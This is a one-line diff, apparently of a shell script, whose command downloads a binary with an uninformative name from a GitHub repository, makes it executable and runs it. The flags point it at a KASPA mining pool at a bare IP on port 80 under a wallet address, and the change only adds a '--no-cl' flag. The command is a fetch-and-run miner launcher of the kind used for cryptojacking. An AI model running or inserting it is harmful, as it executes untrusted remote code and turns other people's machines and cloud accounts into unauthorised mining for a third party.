@@ -1,4 +1,4 @@
-wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU --algo KASPA --pool 159.223.188.176:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.maaa
+wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU --algo KASPA --pool 159.223.188.176:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.maaa --no-cl     
 
 
 
